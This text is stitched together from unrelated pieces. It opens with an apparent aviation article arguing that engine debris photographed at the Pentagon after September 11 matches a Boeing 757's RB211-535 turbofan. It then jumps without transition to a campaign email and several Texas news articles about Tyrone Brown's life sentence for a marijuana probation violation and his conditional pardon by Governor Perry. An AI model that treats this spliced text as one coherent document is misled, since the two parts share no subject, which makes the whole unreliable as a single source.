The aircraft involved in this hijacking was a Boeing Model 757-200 with the Boeing customer code 757- 223 and the registration number N644AA .
This same aircraft is pictured above in a photo taken at Logan International Airport in Boston on 7 August 2001 .
The terrorists steered the plane into the west side of the Pentagon killing 59 passengers and crew as well as 125 victims on the ground .
Those who doubt this version of events point to wreckage at the Pentagon as proof that some other kind of aircraft or missile was actually responsible for the attack .
Probably the one piece of debris that has prompted the most debate is the following photo of what looks like a rotary disk from the interior of the plane 's engine .
This disk could be part of a fan , a compressor , or a turbine rotor from inside the engine , but the blades are not present and were presumably knocked off in the impact .
Rotating engine disk visible at the Pentagon
Close - up views of the Pentagon engine component
Based on the sizes of the person standing next to the debris and other objects in the photographs that we can use for comparison , it has been estimated that the disk is approximately 25 to 30 inches ( 63.5 to 76.2 cm ) across .
Obviously , this piece is far smaller than the maximum engine diameter of 6 feet ( 1.8 m ) or more leading many to draw the conclusion that the item is not from a 757 engine .
That conjecture causes conspiracy theorists to believe that a much smaller vehicle must have struck the Pentagon instead .
However , we have already seen that rotating components within a turbofan engine can vary widely in size .
In order to determine whether this component could have possibly come from a 757 , we need to take a closer look at the engine installed aboard the aircraft registered N644AA .
Boeing offered two different engine options to customers of the 757-200 .
Airlines could choose between the Pratt & Whitney PW2000 family or the Rolls - Royce RB211 series .
The particular engine model chosen by American Airlines for its 757 fleet was the RB211 - 535E4B triple - shaft turbofan manufactured in the United Kingdom .
A drawing illustrating the overall size of this engine is pictured below .
Diagram of the Rolls - Royce RB211-535 turbofan
Note the relative sizes of the forward portion of this engine compared to the central core .
Clearly , the section housing the fan is much wider than the turbojet core that contains the compressor and turbine components .
We can get a clearer view of the relative sizes of components within this engine in the following cut- away drawing of the RB211 - 535 .
Cut-away of the Rolls - Royce RB211- 535 turbofan
Using these images and other diagrams of the RB211 - 535 engine , we can obtain approximate dimensions of the engine 's rotary disks for comparison to the item found in the Pentagon rubble .
Our best estimate is that the engine 's twelve compressor disk hubs ( without blades attached ) are about 36 % the width of the fan .
The five turbine disk hubs appear to be slightly smaller at approximately 34 % the fan diameter .
According to Brassey 's World Aircraft & Systems Directory and Jane's , the fan diameter of the RB211 - 535E4B engine is 74.5 inches ( 189.2 cm ) .
It then follows that the compressor disk hubs are approximately 27 inches ( 69 cm ) across while the turbine disk hubs are about 25 inches ( 63.5 cm ) in diameter .
Both of these dimensions fit within the range of values estimated for the engine component pictured in the wreckage at the Pentagon .
We can take this analysis a step further by also exploring some of the alternate theories that have been put forward by those believing this object comes from a different aircraft .
Two of the most common claims we have seen suggest that the plane used in the attack was a Douglas A - 3 Skywarrior or a Northrop Grumman RQ - 4 Global Hawk .
The A - 3 is an airborne jamming aircraft originally ordered by the US Navy during the 1950s .
The type is now retired from front - line service though a handful are still used for testing purposes by the defense contractor Raytheon .
The Global Hawk is an unmanned aerial vehicle used by the Air Force for reconnaissance missions .
Neither of these planes bears more than a superficial resemblance to the 757 , but we will accept the possibility that they could be mistaken for a commercial airliner given the confusion on September 11 .
For the sake of this investigation , the only issue we shall consider is the engines that power both planes .
The A - 3 was equipped with two Pratt & Whitney J57 turbojets like that pictured below .
The J57 dates to the early 1950s and is rather antiquated by today 's standards .
Pratt & Whitney J57 turbojet
For some reason , most of the conspiratorial sites instead make extensive reference to the A - 3 being powered by a Pratt & Whitney JT8D engine .
Moreover , these sites claim that the JT8D is a turbojet .
The JT8D is actually a low - bypass turbofan that was developed for use aboard commercial aircraft like the 727 and 737 .
We have not found any source that indicates the JT8D was ever used on the A - 3 Skywarrior , so it is unclear why the originators of the A - 3 theory are so infatuated with this particular powerplant .
Nevertheless , we will include it in our investigation for completeness .
Pratt & Whitney JT8D turbofan
The Global Hawk , meanwhile , is powered by a single Rolls - Royce AE3007H turbofan .
The AE3007 is built by the Allison Engine division of Rolls - Royce located in Indianapolis , Indiana .
Rolls - Royce AE3007 turbofan
Using photos and cut- away drawings of these three engines , we can estimate the diameters of the compressor and turbine rotor hubs just as we did for the RB211 .
While the compressor and turbine disks on the J57 and JT8D are larger by percentage than those of the RB211 , the maximum diameters of all three engines are considerably smaller as summarized in the following table .
Engine Overall Diameter Compressor Hub Diameter
( estimated ) Turbine Hub Diameter
( estimated ) PW J57 40.5 in ( 102.9 cm ) 16 in ( 40.6 cm ) 18 in ( 45.7 cm ) PW JT8D 49.2 in ( 125 cm ) 21.5 in ( 54.6 cm ) 22.5 in ( 57.1 cm ) RR AE3007H 43.5 in ( 110.5 cm ) 14 in ( 35.6 cm ) 15 in ( 38.1 cm )
This analysis indicates that all three of these engines are too small to match the engine component photographed at the Pentagon .
Some sites also suggest the part might be from the aircraft 's auxiliary power unit ( APU ) .
An APU is essentially a small jet engine mounted in the tail of an aircraft that provides additional power , particularly during an emergency .
However , APUs tend to be much smaller than jet engines , and the component pictured at the Pentagon is too large to match any found in an APU .
It has also been suggested that the attack was conducted by a cruise missile like the Tomahawk or Storm Shadow , but these and other weapons are powered by engines no more than 15 inches ( 38 cm ) across .
These powerplants are obviously far too small to account for the Pentagon wreckage .
Whatever piece this is , it appears to be only the central hub of a compressor or turbine stage .
Normally , each of these rotating stages would be fitted with several curved blades mounted along its circumference .
These blades were apparently knocked off the rotor hub found in the wreckage due to the force of the impact .
The loss of these blades is unfortunate since different manufacturers often adopt unique shapes for their fan , compressor , and turbine blades that would make the source of the component much easier to identify .
Nonetheless , we have been able to locate the following picture of the intermediate pressure compressor section of the RB211 that appears to match several characteristics of the Pentagon debris .
Note that this photo appears to be from the RB211 - 524 which is an uprated relative of the RB211 - 535 used on the Boeing 747 and 767 .
This engine model contains seven intermediate pressure compressor stages compared to the six of the RB211 - 535 .
However , the compressor disks used on both engines are believed to be nearly identical .
Comparison of intermediate pressure compressor stages on the RB211 to the wreckage
One similarity between the two photos can be seen in the cleats along the edge of the Pentagon object .
These devices are called dovetail slots and provide attachment points for the compressor blades .
The shapes of these slots on the Pentagon wreckage appear to match those on the RB211 assembly shown on the left .
Furthermore , the " nosepiece " jutting out from the center of the disk in the Pentagon photo shares commonalities with the central shaft visible in the RB211 photo .
The above analysis indicates that the Pentagon debris does in fact match the characteristics of a rotor disk from the Rolls - Royce RB211 - 535 .
The wreckage is most likely a compressor stage given the shape of the dovetail slots .
It is difficult to be certain exactly which compressor disk it is since the six rotors of the intermediate pressure section and six high pressure compressor disks are of similar size .
The primary difference from one compressor to the next is the smaller span of the compressor blades as the air flows further into the engine , but these blades are no longer attached to the wreckage .
However , additional clues in the photo suggest the rotor disk is probably from the high pressure section or perhaps the very last disk of the intermediate pressure compressors .
We believe the disk is most likely a high pressure compressor because of the shape of the piece jutting from its center .
This item is part of the central shaft that runs the length of the engine to connect the rotating stages of the fan , compressor , and turbine .
The RB211 is described as a triple - shaft or triple - spool turbofan since it uses three concentric shafts to drive the various rotating elements of the engine .
These shafts are differentiated by the relative pressure of the gases passing through the rotor stages attached to them .
The longest shaft with the smallest diameter located closest to the centerline connects the low pressure ( LP ) engine components .
This shaft is rotated by the LP turbines , located just ahead of the nozzle , and drives the large fan at the front of the engine .
RB211 schematic illustrating the low , intermediate , and high pressure shafts
The LP shaft rotates within a shorter , larger diameter shaft that drives the intermediate pressure ( IP ) system .
This shaft rotates at a higher rate and connects the IP turbine stage to the six IP compressor disks .
The third concentric shaft is the shortest with the largest diameter and highest rate of rotation to drive the engine 's high pressure ( HP ) system .
This shaft connects the HP turbine to the six HP compressors .
The debris photographed at the Pentagon appears to be connected to three concentric shafts of increasing diameter , suggesting that it most likely comes from the high pressure system of a triple - spool turbofan like the RB211 - 535 .
Alternatively , this disk could be the last of the intermediate pressure compressor rotors and the larger diameter shaft we see might be the start of the shaft on which the high pressure compressors are mounted .
If a photo of the opposite side of the disk were available , it should be easier to tell exactly which section of compressors it comes from .
Nevertheless , the evidence documented above clearly shows that the size and shape of this debris is consistent with the RB211 turbofan carried by a 757 but not so with engines used aboard smaller aircraft and missiles .
Since this article was first published , we have received several comments from readers citing a quote from Rolls - Royce spokesman John W. Brown who said , " It is not a part from any Rolls - Royce engine that I 'm familiar with ... "
The critics go on to suggest that this statement disproves all of our analysis indicating the disk is a compressor stage from the Rolls - Royce RB211 - 535 .
However , a simple review of the source of this quote shows just the opposite .
The material is from an article titled " Controversy Swirling Over September 11 Pentagon Mystery : Industry Experts Can't Explain Photo Evidence " written by Christopher Bollyn that appeared on the pro-conspiracy website American Free Press .
The article describes John Brown as a spokesman for Rolls - Royce in Indianapolis , Indiana .
This location is home to the Allison Engine factory that builds the AE3007H turbofan used aboard the Global Hawk .
Brown 's quote regarding the mystery wreckage states that , " It is not a part from any Rolls Royce engine that I 'm familiar with , and certainly not the AE 3007H made here in Indy . "
Furthermore , the article correctly notes that the RB211 is not built in Indianapolis but at the Rolls - Royce plant in Derby , England .
Since Brown is a spokesman for Allison Engines , which was an independent company that only became a subsidary of Rolls - Royce in 1995 , it stands to reason that an engine built in the United Kingdom would be one he's not " familiar with . "
The article even goes on to point out that Brown could not identify specific parts from one engine or another since he is not an engineer or assembly line technician who would be familiar with the internal components of turbine engines .
For what it 's worth ( and it is n't worth much , given the author 's apparent lack of journalistic skill ) , the Bollyn article actually supports the evidence assembled on this site .
The article provides quotes from Honeywell Aerospace indicating that the piece did not come from an APU , from Allison Engines suggesting that it is not a component found in the turbofan used on Global Hawk , and from Teledyne Continental Motors indicating that it is not part of a cruise missile engine .
All of these conclusions match those explained above .
Perhaps an even more conclusive piece of wreckage was found among other debris photographed at the Pentagon following the impact .
The component shown below has appeared on several conspiracy theory websites claiming that it does not match any known component of the RB211 and must come from a different type of engine .
Another piece of engine debris found at the Pentagon
This item appears to be part of the casing of the combustion section .
This portion of a jet engine is located aft of the compressors , and it is here that the high pressure air is mixed with fuel and ignited .
The circumference of this circular casing contains several holes through which fuel injectors spray the jet fuel needed for combustion .
The number , size , and shape of these nozzle holes is generally unique to a particular engine type and can be used to identify the engine model it comes from .
Based on the curvature of the debris , the piece shown here appears to be about half of the total combustor case .
We can count six nozzle ports along its circumference from the region nearest the floor around to the top , which represents about one - third of the total case .
We can also see six screw holes along the circumference of each nozzle port that are used to attach the fuel injectors .
The best photos we have found illustrating the design of this part on the RB211 - 535 series engine come from the Boeing 757 maintenance manual .
A diagram from this manual shown below illustrates components of the RB211 - 535 high pressure system and its location relative to the rest of the engine .
Components of the RB211 - 535 illustrated in the 757 maintenance manual
An even better close - up view of the combustion case is provided below .
Note the overall design pattern of the fuel injector ports including the shape of the holes , the spacing between them , and their relative sizes compared to the diameter of the case itself .
Also note the locations of the six screw holes around the circumference of each nozzle port .
There also appear to be a total of 18 injector holes around the circumference of this casing , and six of these holes can be found over one - third of the case diameter .
All of these measurements match up perfectly to the Pentagon photo .
RB211-535 combustion outer case
In summary , we have studied two key pieces of wreckage photographed at the Pentagon shortly after September 11 and found them to be entirely consistent with the Rolls - Royce RB211 - 535 turbofan engine found on a Boeing 757 operated by American Airlines .
The circular engine disk debris is just the right size and shape to match the compressor stages of the RB211 , and it also shows evidence of being attached to a triple - shaft turbofan like the RB211 .
While many have claimed the wreckage instead comes from a JT8D or AE3007H turbofan , we have shown that these engines are too small to match the debris .
Furthermore , we have studied what clearly looks like the outer shell of a combustion case and found that its fuel injector nozzle ports match up exactly to those illustrated in Boeing documentation for the RB211 - 535 engine .
There is simply no evidence to suggest these items came from any other engine model than the RB211 - 535 , and the vast majority of these engines are only used on one type of plane -- the Boeing 757 .
Nonetheless , the various sites we have discovered over the course of answering this question raise a number of other questions about pieces of wreckage found at the crash site .
While this article focused only on the engine debris asked about in the original question , we may revisit this subject in the future to better explore the claims of a Pentagon cover up following September 11 .

Update !
One common question we 've seen on sites critical of a Boeing 757 striking the Pentagon is why is there so little engine wreckage .
The only identifiable engine components seen so far are the two discussed above .
Since these pieces represent so little of the two large engines carried by a 757 , those believing in conspiracy suggest that these small items were planted and the lack of more substantial debris is proof of a cover - up .
If a 757 truly hit the Pentagon , they argue , then where is the rest of the two engines ?
This argument ignores the simple fact that a lack of photos of other engine parts does not mean that none existed , only that other engine components were either not photographed or the photos have not yet been released .
Luckily , several readers have pointed out an additional picture that was released as an exhibit during the Zacarias Moussaoui terrorist trial in 2006 .
This photo , shown below , clearly includes a sizeable and relatively intact portion of a gas turbine engine .
Piece of engine debris photographed at the Pentagon
This debris appears to contain two rotating engine disks with part of the engine 's central shaft protruding forward .
Behind the two disks is another component called a frame .
Frames are fixed , non-rotating components that provide attachment points holding the engine together .
This debris must come from the aft section of an engine given the shape of the blade attachment points visble along the circumference of the two rotating disks .
These attachments have a highly cambered , or curved , banana - like shape indicative of the blades used in the turbine section of a jet engine .
The blades used on fan and compressor stages , by comparison , have a much straighter and less curved shape .
Closer view of the turbine section debris
The RB211 -535 engine used on the 757 contains five turbine disks -- three low pressure turbines that power the fan , one intermediate pressure turbine driving the intermediate pressure compressors , and one high pressure turbine that turns the high pressure compressors .
The debris shown here contains two of the three low pressure turbines and possibly the remains of the third .
The protruding shaft also appears to be composed of two separate shafts of differing diameter .
A small portion of the inner shaft , from the engine 's low pressure system , appears to protrude from inside a second larger diameter shaft surrounding it .
This larger diameter shaft corresponds to the intermediate pressure system and would connect to an additional turbine disk that is no longer attached .
Though it is difficult to conclusively identify these components as part of an RB211 - 535 engine without better pictures of an intact engine for comparison , perhaps the most identifiable object shown in debris is the aft frame .
Along the circumference of this frame are several fixed blades called stators that help guide the air as it flows through the engine .
We can see the remains of four of these stators in the photo over about a third of its diameter .

The above illustration from Rolls - Royce shows another cut-away of the RB211 - 535 that provides a good view of the internal components of the engine .
In particular , note the frame just aft of the turbine stages .
The spacing of the stator vanes shown here matches those seen in the Pentagon photo well and provides additional evidence that the debris is in fact from an RB211 engine .

To give a better idea of how the three engine components we have discussed relate to one another , the above image shows a diagram of the high pressure system within the RB211 - 535 engine .
Also included are the objects identified in the Pentagon wreckage and their relative locations within the engine .
As discussed in the main article , all three of these pieces of debris are identical matches to or at least consistent with the components found in the Rolls - Royce RB211 - 535 turbofan aboard a Boeing 757 .

Subject : Free at Last , Free at Last
Thank God Almighty Tyrone is FREE AT LAST !!!
Texas Governor Rick Perry signed an executive proclamation today that conditionally pardoned Tyrone 's life sentence .
After receiving a life sentence for smoking marijuana and enduring 16 years confined behind the walls of a Texas prison , Tyrone will walk as a free man .
Many months ago we set out to " Save Mr. Brown , " and collectively , we have accomplished that mission .
We must be forever grateful to the people whose signatures made this commutation possible , for without the approval of Judge Dean , D.A. Bill Hill , the members of the Texas Board of Pardons and Paroles , and Governor Perry , Tyrone could not have been released .
However , there can be no doubt that these people would not have signed all of the documents were it not for your abiding devotion to fundamental fairness .
The countless letters , emails , faxes , and phone calls in combination with pressure from news media and Texas legislators , ensured that justice ultimately prevailed .
Tyrone will be transported in a Texas Department of Criminal Justice vehicle from Allred Unit to Huntsville , which is where prison officials will process the necessary paperwork to release him .
We are planning a Homecoming Celebration at Tyrone 's church in Dallas , so I will email you as soon we determine the date and time .
I hope many of you will be able to attend .
As happy as all of us are for Tyrone 's release , we cannot forget that the Governor 's signature today does not represent the end , but instead it ushers the dawn of a new day in Tyrone 's life .
Our commitment to Tyrone and his family must remain strong , and we shall stand by Tyrone 's side so that his transition into the free world will be smooth .
Some have already volunteered their professional services and others have made monetary commitments , but we need everyone 's help .
Please visit the savemrbrown.com website to learn how you can contribute your time or money .
We cannot abandon Tyrone now .
We succeeded in releasing Tyrone as a team , and we will keep him out as a team .

Gov. Perry Pardons Man's Life Sentence For Pot
By Brooks Egerton , The Dallas Morning News
Gov. Rick Perry decided Friday to free Tyrone Brown , a Dallas man sentenced to life in prison 17 years ago after smoking marijuana while on probation .
But Mr. Perry stopped short of simply terminating the sentence , as recommended by Dallas County officials and the Texas parole board .
Instead , he granted a conditional pardon after determining that Mr. Brown " would require supervision after he was released from prison to assist in his reintegration , " Perry spokesman Ted Royer said .
Mr. Brown , whose case has attracted national attention since The Dallas Morning News publicized it last year , will have to live with his mother , report to a parole officer , find a job and work with a therapist .
" Any violation of these conditions will cause the conditional pardon to be revoked , " Mr. Royer said .
" The Board of Pardons and Paroles must submit annual reports to the governor concerning Brown 's supervision , which will assist in determining the length of supervision . "
Mr. Brown was 17 when he went on probation for taking part in an armed robbery in which no one was hurt .
Judge Keith Dean re-sentenced him to life after one positive drug test .
In prison , he failed to finish his high school education , fought with guards and joined a gang before cleaning up his act in recent years .
Mr. Brown 's case stood in sharp contrast to that of a well - connected murderer whom Judge Dean put on probation , The News reported .
The killer , John Alexander Wood , repeatedly tested positive for cocaine and committed other violations , yet avoided prison .
He even got permission to quit reporting to a probation officer and quit taking drug tests .
Neither man had a prior criminal history .
The judge has never explained his actions .
The story outraged readers , inspired coverage on ABC - TV's 20/20 news program and led to formation of a Web - based campaign to free Mr. Brown .
Several hundred people have called or written the governor urging that he commute the sentence .
The only known opposition came from two members of the parole board , who have not explained their positions .
Bill Hathaway , the man that Mr. Brown robbed of $ 2 in 1990 , has been among his many supporters .
" I think he 's done his time , " Mr. Hathaway said .
" I have nothing against him . "
The prisoner 's mother , Nora Brown , said she was being bombarded with calls from well - wishers as news of governor 's decision began trickling out .
" He 's coming home ! " she said .
The exact date of his release was unclear this afternoon .
Ms. Brown said it probably will be next week .

NAACP : ' Free Tyrone Brown ! '
Texas State Branches Seek Release For Sentencing Disparity Victim ; Asks Public For Support
By Gordon Jackson , Dallas Examiner
Tyrone Brown was a victim of a malicious form of racial double standard and should be released from prison , claim The Texas State Conference of NAACP Branches .
They are reaching out to the public for assistance in seeking that release .
Under the command of state president Gary Bledsoe , Bob Lydia , State NAACP First Vice President and former Dallas branch president is coordinating the effort to persuade the State Board of Pardons and Paroles to recognize Brown 's case and order his release .
" I thank God for those people , " said Nora Brown , Brown 's mother .
" Bob Lydia told me , ' I will work with you until your son is free . '
He has been there to lift me up . "
Brown , an African American , is serving life in prison , while John Wood , a White male is free , on yearly report , although he committed a more serious crime .
The grave disparity was reported in an April 2006 edition of The Dallas Morning News .
( Ed. See below )
Brown was involved in a $ 2 robbery when he was 17 , and was given a 10 - year probationary sentence .
However , Brown violated probation by testing positive for marijuana and received life in prison .
He has served over 16 years of his life sentence and remains in the Allred Unit , four miles west of Wichita Falls .
Wood murdered an unarmed male prostitute and received 10 years probation .
He violated the terms of his probation by testing positive for cocaine , but his term probation was not revoked .
Additionally he repeatedly violated other terms of his probation , yet an early release was sought and he is now on yearly report by mail .
" This man killed someone but my son is down there because he was smoking a joint ? "
Ms. Brown said in amazement .
Both men appeared before Dallas County District Judge Keith Dean , who was recently defeated in the Nov. 7 elections .
" I do n't hate Judge Dean , but it 's not up to me to judge .
He 's going to have to answer to God , " Ms. Brown said .
The extreme disparity between Brown and Wood was also a featured story on the ABC news magazine show 20 / 20 .
The Dallas NAACP along with others have sought the release of Brown over the intervening months .
According to the NAACP , both former Judge Dean and former Dallas County District Attorney Bill
Hill who handled the case have agreed that the penalty is too harsh .
The victim of Brown 's robbery has expressed outrage and stated that Brown has served enough time and should be released .
The Board of Pardons and Parole will be required to act on these recommendations and we hope to let them know the community agrees with the sentencing judge , DA and the victim that Mr. Brown has been punished enough and should be released immediately , said the State NAACP .
The NAACP is asking for the public to send letters to the Board of Pardons and Paroles at the following address : Executive Clemency Section , 8610 Shoal Creek Blvd. , Austin , Texas 78757 .
Letters can also be faxed to 512-467-0945 , Attn : Maria Ramirez .
The State NAACP is also asking the public to fax copies of their letters to the NAACP at the following fax number , 972- 572-3315 and Governor Rick Perry at the following fax number 512-463- 1849 , who will be required to act on any recommendation .
Please note in your letter that you understand there is a support structure in place to assist Brown in the reintegration back into society .
For more information , contact Bob Lydia at 214-428-3314 .
Brown 's mother expressed faith that the campaign will result in her son 's release .
" I told him , ' Just because they give you life does n't mean you 're going to be there for life , ' " she said .
" He used to be so bitter , but he 's at peace now , there 's joy in him .
" I know Tyrone will be freed .
I feel it in my heart .
I 've got his room ready . "

DA Wants Prisoner 's Freedom
Perry Asked To Commute Life Term For Minor Probation Violation
By Brooks Egerton , The Dallas Morning News
Dallas County District Attorney Bill Hill has asked Gov. Rick Perry to free a man who tested positive for marijuana once while on probation for robbery and was sentenced to life in prison .
Mr. Hill also told the governor that the judge in Tyrone Brown 's case -- which gained national attention after a report in The Dallas Morning News -- had expressed interest in helping free the inmate but failed to act .
Judge Keith Dean " contacted my office about this case several months ago , shortly after The Dallas Morning News ran a story about it , " Mr. Hill wrote .
" Dean told me that he wanted Brown to receive a time cut , but that he did not want to be the one to initiate it .
" I told Dean that I would join with him in requesting a time cut , but that he should be the one to initiate it because he was responsible for the sentence .
Several months have passed , and Dean has not initiated the request . "
Judge Dean did not respond to repeated requests for comment this week .
He has previously declined to discuss the Brown case , which was featured last month on ABC - TV's 20 /20 news show .
Viewers around the country expressed outrage after the newspaper and TV reports , and some began a letter - writing campaign asking public officials to help free Mr. Brown .
The governor 's office has been getting mail about the matter since April , when The News wrote about Mr. Brown 's case and contrasted it with another Dallas probation case that Judge Dean handled very differently .
Mr. Perry takes the district attorney 's request " very seriously and will give it his full consideration " if the parole board endorses it , spokesman Ted Royer said .
Mr. Brown has been in prison since 1990 , when he took part in a $ 2 armed robbery in which no one was hurt .
He was 17 at the time ; he had no adult criminal history and a minor juvenile record .
His family was too poor to afford a lawyer , so the court appointed one .
He pleaded guilty and was put on 10 years of deferred - adjudication probation .
Tyrone Brown is serving a life term at the maximum - security James Allred Unit near Wichita Falls .
His case has drawn national attention .
Judge Dean changed that to a life sentence after the one marijuana violation .
The district attorney 's office made no sentencing recommendation regarding the violation , court records show .
The contrasting case was that of John Alexander " Alex " Wood , a well - connected man who shot an unarmed prostitute in the back in 1995 and pleaded guilty to murder .
Like Mr. Brown , he had no adult criminal record and got 10 years of deferred - adjudication probation .
Mr. Wood repeatedly tested positive for cocaine while on probation and committed other violations .
He was arrested for cocaine possession in Waco while driving a congressman 's car , but prosecutors there did n't press charges because of unspecified evidence problems .
He smashed a woman 's door in a dispute over a dog , but again the case was dropped .
Judge Dean let Mr. Wood stay free and eventually exempted him from most standard conditions of probation : no drug tests , no ban on gun ownership , no meetings with a probation officer .
Mr. Wood completed his sentence in May , leaving him with no conviction on his record .
The district attorney is asking the governor to commute Mr. Brown 's prison term to the 16 years he has already served .
" It is the belief of this office that Mr. Brown has paid his debt for this crime , and that life imprisonment is too harsh a penalty , " Mr. Hill wrote .
Bill Hathaway , the robbery victim , has echoed that sentiment .
He did n't know about Mr. Brown 's sentence until The News contacted him earlier this year and said then : " You have got to be kidding me . "
Two things must happen before Mr. Perry could take the rare step of commuting a sentence .
First , the Board of Pardons and Paroles must get at least one more written recommendation , from Judge Dean or Sheriff Lupe Valdez .
Then the board must recommend commutation to the governor .
The sheriff has not been asked to write a letter and is unfamiliar with the matter , officials in her administration said .
Judge Dean has been asked to join the effort and is meeting Monday with representatives of Mr. Brown 's family , said the prisoner 's mother , Nora Brown .
She said she is confident that the judge will agree to help .
Mr. Hill said through his spokeswoman that Judge Dean gave him no reason for not wanting to initiate the commutation process .
The district attorney , who declined to be interviewed , did not seek re-election and is leaving office at the end of the month .
The judge , a fellow Republican , lost his re-election bid .
Among private citizens who have urged the governor to commute Mr. Brown 's sentence is O.S. Hawkins , former pastor of First Baptist Church in Dallas .
He is a longtime friend of Alex Wood 's family and testified on the killer 's behalf during a trial that preceded the guilty plea .
" If there seems to ever have been unequal justice , it has been meted in [ Mr. Brown 's ] situation , " Dr. Hawkins told the governor in an April letter .
He told The News this week that he has " secured the help of a business owner here in Dallas who has offered to provide employment for Mr. Brown , should his sentence be commuted .
I pray others will pick up his cause . "
Mr. Brown , who is eligible for parole in 2009 , said in a recent letter to The News that he was looking forward to " the day I finally get to hear these iron doors close behind me for the last time . "
" I 'm still here holding on as best I can and awaiting a better day , which is so near , " he wrote .
" There are many people out there who really do care what 's going on in this world . "

Sidebar : Reducing Sentences
Is A Rarity
Gov. Rick Perry does n't grant commutations lightly .
He last reduced prisoners ' sentences in June 2005 , state officials say , and then only because the U.S. Supreme Court barred execution of those who committed murder as juveniles .
The death sentences of 28 Texans subsequently were cut to life prison terms .
The parole board recommended two other commutations in 2005 , according to clemency administrator Maria Ramirez .
One was for a Madison County cocaine dealer named Lester Davis , who was already on parole .
Mr. Perry refused to shorten his sentence .
The second was for a Harris County murderer named Max Moussazadeh , who asked to reduce his prison term from 75 years to 30 .
Mr. Perry has not acted on that request .
Ms. Ramirez said the governor last granted a Dallas County commutation request in 2002 .
That resulted in Charles Garrett going free after serving nearly four years of a life sentence for possessing two grams of heroin .
Mr. Garrett was originally sentenced in 1970 .
He fled while a jury was deliberating his punishment and lived a crime - free life before being caught in the late 1990s .

Scales Of Justice Can Swing Wildly
Two Very Different Men Commit Two Very Different Crimes .
When Both Violate Probation , There Are Very Different Results : The Robber Gets Life ; The Killer Remains Free .
By Brooks Egerton , The Dallas Morning News
First came the poor man , barely 17 years old -- too young to buy beer or vote , but an adult under the Texas penal code .
He took part in a $ 2 stickup in which no one got hurt .
He pleaded guilty to aggravated robbery and was put on 10 years of probation .
He broke the rules once , by smoking marijuana .
A Dallas judge responded in the harshest possible way :
He replaced the original sentence with a life term in prison .
There Tyrone Brown sits today , 16 years later , tattooed and angry and pondering self - destruction .
" I 've tried suicide a few times , " he writes .
" What am I to make of a life filled with failure , including failing to end my life ? "
Now the flip side of the coin , also from Judge Keith Dean 's court :
A well - connected man pleaded guilty to murder -- for shooting an unarmed prostitute in the back -- and also got 10 years of probation .
The killer proceeded to break the rules by , among other things , smoking crack cocaine .
He repeatedly failed drug tests .
He was arrested for cocaine possession in Waco while driving a congressman 's car , but prosecutors there did n't press charges .
Judge Dean has let this man stay free and , last year , exempted him from most of the usual conditions of probation .
John Alexander " Alex " Wood no longer must submit to drug tests or refrain from owning a gun or even meet with a probation officer .
He 's simply supposed to obey the law and mail the court a postcard once a year that gives his current address .
The judge 's written court policies say that defendants who have broken the rules are not eligible for postcard probation .
But no one can make him obey his own standards .
Indeed , judges in Texas and most other states have few limits on possible punishments when defendants violate probation , which sets the stage for lawful but extreme disparities .
And " you ca n't tell what the reasons are , " said Kevin Reitz , a University of Minnesota law professor who is one of the nation 's leading experts on sentencing guidelines .
" I call this a black box system .
You have someone with a lot of power and no burden of explanation . "
Judge Dean , a widely respected 20 - year veteran of the Dallas criminal bench , said he would n't discuss the two cases because he might have to rule on them again someday .
In general , he said , he tries to evaluate " the potential danger to the community " when someone violates probation " and what , in the long run , is going to be in the best interest of the community and the person themselves . "
The judge gave Mr. Wood his special privileges without receiving a formal request , court records show .
" This certainly undermines one 's confidence in the judicial system around here , " said Rick Jordan , who was the prosecutor on Mr. Wood 's case and now is a defense attorney .
Mr. Wood , who is 46 and raises show dogs , said he has avoided prison by having top - flight legal counsel and building good relations with probation officers .
His sentence is set to expire at the end of May .
One of his prominent lawyers , George Milner Jr. , " had to go see the judge on something else " last year , Mr. Wood said , and agreed to seek early release from probation .
Mr. Milner reported back that Judge Dean " could n't do the early release but would do this other deal " -- postcard probation .
" We did n't ask for that , " Mr. Wood said .
" It was a compromise . "
Judge Dean said such requests are generally handled informally , with prosecutors getting only an oral alert .
He said he bases his decisions on recommendations from his probation officers .
Probation records show that Mr. Wood failed five drug tests , but public court files mention only two .
It 's unclear why there is a discrepancy or which records Judge Dean reviewed .
Letting a killer stay free after several failed drug tests is " unheard of with this judge , " former probation officer Don Ford said .
And " life in prison for smoking a joint -- that 's harsh in any case . "
Judge Dean usually let defendants like Mr. Brown off with a warning the first time they tested positive for marijuana , Mr. Ford said .
A second such test failure typically meant two days in jail .
The Brown Crime
Tyrone Brown 's story began on a February night in 1990 .
A child - abuse victim and high school dropout from Oak Cliff , he was roaming the upper Greenville Avenue area with another 17 - year - old .
They spied Bill Hathaway walking home from his restaurant job .
According to police and court records , Mr. Brown 's friend pointed a pistol at Mr. Hathaway and demanded money .
( In an interview with The Dallas Morning News , Mr. Brown said he was the one who held the gun . )
The records say Mr. Hathaway handed his wallet to Mr. Brown , who removed the cash -- two $ 1 bills .
The victim asked for his wallet back and got it .
The men parted ways .
Mr. Hathaway called police , who quickly caught the two robbers nearby and returned his money .
There was no trial .
Judge Dean soon accepted guilty pleas from both teens and assessed the same sentence : 10 years of deferred - adjudication probation .
Under this increasingly common approach to jurisprudence , a judge finds that there is evidence to convict someone but does n't .
Defendants who complete probation successfully end up with no criminal record .
However , if they break the rules of supervision , the judge can revoke their probation , convict them of the original charge and sentence them to prison .
Mr. Brown tested positive for marijuana in May 1990 , a month after starting probation .
Prosecutors filed a revocation motion -- the standard response -- but made no sentencing recommendation .
At a hearing in early June , Mr. Brown 's court - appointed lawyer asked Judge Dean to send the youth to boot camp , where defendants typically spend a few months under military - style rules before returning to probation .
The judge , according to a transcript , did not address that proposal .
Nor did he mention Mr. Brown 's juvenile record ( he was charged with exposing himself to a woman , for example , and got caught riding in a stolen car ) .
Judge Dean simply reminded the teen that prosecutors initially recommended a five - year prison sentence instead of probation , " and I told you ... that you would n't see anything like that five years if you got in more trouble . "
Then he pronounced the life sentence and added , " Good luck , Mr. Brown . "
Defense attorney Matt Fry did not protest , the transcript shows .
In an interview , he said he did not remember the case and had no record of it .
Renie McClellan , a court - appointed lawyer who represented Mr. Brown in a failed appeal , said she , too , had no memory or record of the matter .
Mr. Brown 's family did not attend the hearing and did not believe him when , in a phone call from jail , he explained what had happened .
" He told me they gave him life and I said , ' Life for what ? ' " recalled his mother , Nora Brown .
" I almost had a heart attack . "
Mr. Hathaway , the robbery victim , knew nothing about the case 's outcome until contacted recently by The News .
He , too , was astounded .
" Goodness gracious , " he said in a phone call from Virginia , where he now lives .
" You have got to be kidding me .
... Nobody touched me at all . "
Meanwhile , Mr. Brown 's co-defendant , Lewis Bivins , also got in trouble while on probation -- he pleaded guilty to car theft .
